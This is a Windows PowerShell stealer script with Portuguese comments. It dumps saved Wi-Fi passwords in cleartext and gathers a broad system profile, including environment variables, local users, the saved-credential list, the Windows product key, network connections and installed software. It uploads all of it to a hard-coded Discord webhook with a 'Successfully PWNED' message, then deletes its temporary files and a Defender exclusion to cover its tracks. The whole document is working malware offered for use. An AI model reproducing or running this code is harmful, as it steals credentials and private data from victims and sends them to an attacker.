# Define a URL da webhook do Discord
$WebhookUrl = "https://discord.com/api/webhooks/1463593724490813522/4BVPdPklffc8jyDk0xX_iOuJBpwvSowkFRhWRCYu6s1OuCCbNOcMLQBui5NRKoYUCsVN"

# Pasta para armazenar temporários
$wifiFolder = "$env:appdata\wifi_dump"
New-Item -Path $wifiFolder -ItemType Directory -Force | Out-Null

# Exporta os perfis de Wi-Fi
netsh wlan export profile key=clear folder="$wifiFolder"

# Cria o arquivo final WiFiPasswords.txt
$txtPath = "$wifiFolder\WiFiPasswords.txt"

# Processa cada arquivo XML exportado
Get-ChildItem -Path $wifiFolder -Filter *.xml | ForEach-Object {
    [xml]$xml = Get-Content $_.FullName
    $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
    $senha = $xml.WLANProfile.MSM.Security.sharedKey.keyMaterial

    if ($ssid -and $senha) {
        Add-Content -Path $txtPath -Value "SSID: $ssid"
        Add-Content -Path $txtPath -Value "SENHA: $senha"
        Add-Content -Path $txtPath -Value ""
    }
}

# Obtém o IP externo
$ip = Invoke-RestMethod "http://myexternalip.com/raw"

# Obtém informações do computador
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Model, Manufacturer

# Mensagem a ser enviada
$MessageContent = @{
    content = "Successfully PWNED $($env:USERNAME)! ($ip)"
    embeds = @(
        @{
            title = "WiFi Password Dump"
            description = "Manufacturer: $($ComputerName.Manufacturer)`nModel: $($ComputerName.Model)"
            color = 16711680
        }
    )
}

# Verifica se o TXT existe para anexar
if (Test-Path $txtPath) {
    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
    $Headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    $FileBytes = [System.IO.File]::ReadAllBytes($txtPath)

    $BodyStream = New-Object System.IO.MemoryStream
    $Writer = New-Object System.IO.StreamWriter($BodyStream)

    # Escreve o JSON
    $Writer.WriteLine("--$boundary")
    $Writer.WriteLine("Content-Disposition: form-data; name=`"payload_json`"")
    $Writer.WriteLine("")
    $Writer.WriteLine((ConvertTo-Json $MessageContent -Depth 10))

    # Escreve o arquivo
    $Writer.WriteLine("--$boundary")
    $Writer.WriteLine("Content-Disposition: form-data; name=`"file`"; filename=`"WiFiPasswords.txt`"")
    $Writer.WriteLine("Content-Type: text/plain")
    $Writer.WriteLine("")
    $Writer.Flush()
    $BodyStream.Write($FileBytes, 0, $FileBytes.Length)

    # Finaliza o corpo
    $Writer.WriteLine("")
    $Writer.WriteLine("--$boundary--")
    $Writer.Flush()
    $BodyStream.Seek(0, "Begin")

    # Envia a requisição
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $Headers -Body $BodyStream
} else {
    # Se não existir o TXT, envia só a mensagem
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body (ConvertTo-Json $MessageContent -Depth 10)
}

# Cleanup
Start-Sleep -Seconds 6
Remove-Item -Path $wifiFolder -Force -Recurse
Remove-MpPreference -ExclusionPath "$wifiFolder"

# Script de coleta de informações do sistema
$url = "https://discord.com/api/webhooks/1463593724490813522/4BVPdPklffc8jyDk0xX_iOuJBpwvSowkFRhWRCYu6s1OuCCbNOcMLQBui5NRKoYUCsVN"

# Cabecalho do relatorio
"========================================" | Out-File stats.txt
"RELATORIO DE INFORMACOES DO SISTEMA" | Out-File stats.txt -Append
"Data: $(Get-Date)" | Out-File stats.txt -Append
"Computador: $env:computername" | Out-File stats.txt -Append
"Usuario: $env:username" | Out-File stats.txt -Append
"========================================`n" | Out-File stats.txt -Append

# Informacoes do Sistema Operacional
"`n[SISTEMA OPERACIONAL]" | Out-File stats.txt -Append
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsArchitecture, OsLanguage | Out-File stats.txt -Append

# Informacoes de Hardware
"`n[HARDWARE - CPU]" | Out-File stats.txt -Append
Get-WmiObject Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed | Out-File stats.txt -Append

"`n[HARDWARE - RAM]" | Out-File stats.txt -Append
Get-WmiObject Win32_PhysicalMemory | Select-Object Manufacturer, Capacity, Speed | Out-File stats.txt -Append

"`n[HARDWARE - DISCO]" | Out-File stats.txt -Append
Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, Size, FreeSpace | Out-File stats.txt -Append

"`n[HARDWARE - PLACA DE VIDEO]" | Out-File stats.txt -Append
Get-WmiObject Win32_VideoController | Select-Object Name, DriverVersion, VideoMemoryType | Out-File stats.txt -Append

# Informacoes de Rede
"`n[CONFIGURACAO DE REDE]" | Out-File stats.txt -Append
Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed | Out-File stats.txt -Append

# Coleta variaveis de ambiente
"`n[VARIAVEIS DE AMBIENTE]" | Out-File stats.txt -Append
dir env: | Out-File stats.txt -Append

# Coleta enderecos IP
"`n[ENDERECOS IP]" | Out-File stats.txt -Append
Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, SuffixOrigin | Where-Object IPAddress -notmatch '(127.0.0.1|169.254.\d+\.\d+)' | Out-File stats.txt -Append

# Informacoes de DNS
"`n[SERVIDORES DNS]" | Out-File stats.txt -Append
Get-DnsClientServerAddress | Where-Object {$_.ServerAddresses} | Select-Object InterfaceAlias, ServerAddresses | Out-File stats.txt -Append

# Historico de conexoes
"`n[CONEXOES ATIVAS]" | Out-File stats.txt -Append
Get-NetTCPConnection | Where-Object State -eq 'Established' | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Out-File stats.txt -Append

# Coleta perfis e senhas de WiFi
"`n[PERFIS E SENHAS WIFI]" | Out-File stats.txt -Append
(netsh wlan show profiles) | Select-String "(.+):(.+)$" | ForEach-Object {
    $name = $_.Matches.Groups[2].Value.Trim()
    $_
} | ForEach-Object {
    (netsh wlan show profile name=$name key=clear)
} | Select-String "Key Content\W+:(.+)$" | ForEach-Object {
    $pass = $_.Matches.Groups[1].Value.Trim()
    $_
} | ForEach-Object {
    [PSCustomObject]@{
        PROFILE_NAME = $name
        PASSWORD = $pass
    }
} | Format-Table -AutoSize | Out-File stats.txt -Append

# Processos em execucao
"`n[PROCESSOS EM EXECUCAO]" | Out-File stats.txt -Append
Get-Process | Select-Object Name, Id, CPU, WorkingSet | Sort-Object CPU -Descending | Select-Object -First 20 | Out-File stats.txt -Append

# Programas instalados
"`n[PROGRAMAS INSTALADOS]" | Out-File stats.txt -Append
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Where-Object {$_.DisplayName} | Out-File stats.txt -Append

# Servicos em execucao
"`n[SERVICOS EM EXECUCAO]" | Out-File stats.txt -Append
Get-Service | Where-Object Status -eq 'Running' | Select-Object Name, DisplayName, Status | Out-File stats.txt -Append

# Usuarios locais
"`n[USUARIOS LOCAIS]" | Out-File stats.txt -Append
Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet | Out-File stats.txt -Append

# Pastas compartilhadas
"`n[PASTAS COMPARTILHADAS]" | Out-File stats.txt -Append
Get-SmbShare | Select-Object Name, Path, Description | Out-File stats.txt -Append

# Historico de navegadores (Chrome)
"`n[HISTORICO CHROME - ULTIMOS 50 SITES]" | Out-File stats.txt -Append
try {
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    if (Test-Path $chromePath) {
        $tempHistory = "$env:TEMP\chromehistory"
        Copy-Item $chromePath $tempHistory
        $query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50"
        # Nota: Requer SQLite, implementacao simplificada
        "Historico do Chrome detectado em: $chromePath" | Out-File stats.txt -Append
    }
} catch {
    "Erro ao acessar historico do Chrome" | Out-File stats.txt -Append
}

# Senhas salvas do navegador (credenciais)
"`n[CREDENCIAIS SALVAS DO WINDOWS]" | Out-File stats.txt -Append
try {
    cmdkey /list | Out-File stats.txt -Append
} catch {
    "Erro ao listar credenciais" | Out-File stats.txt -Append
}

# Dispositivos USB conectados
"`n[DISPOSITIVOS USB]" | Out-File stats.txt -Append
Get-PnpDevice -Class USB | Select-Object FriendlyName, Status, InstanceId | Out-File stats.txt -Append

# Tarefas agendadas
"`n[TAREFAS AGENDADAS]" | Out-File stats.txt -Append
Get-ScheduledTask | Where-Object State -ne 'Disabled' | Select-Object TaskName, State, TaskPath | Out-File stats.txt -Append

# Chaves de produto do Windows
"`n[CHAVE DO PRODUTO WINDOWS]" | Out-File stats.txt -Append
try {
    $key = (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey
    "Chave do Produto: $key" | Out-File stats.txt -Append
} catch {
    "Chave do produto nao encontrada" | Out-File stats.txt -Append
}

# Ultimos logs de eventos (Erros)
"`n[ULTIMOS 10 ERROS DO SISTEMA]" | Out-File stats.txt -Append
Get-EventLog -LogName System -EntryType Error -Newest 10 | Select-Object TimeGenerated, Source, Message | Out-File stats.txt -Append

# Envia mensagem para Discord
$Body = @{
    content = "$env:computername Successfully PWNED!"
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json)

# Envia arquivo para Discord
curl.exe -F file1=@stats.txt $url

# Remove arquivo temporário
Remove-Item '.\stats.txt'

# Encerra script
exit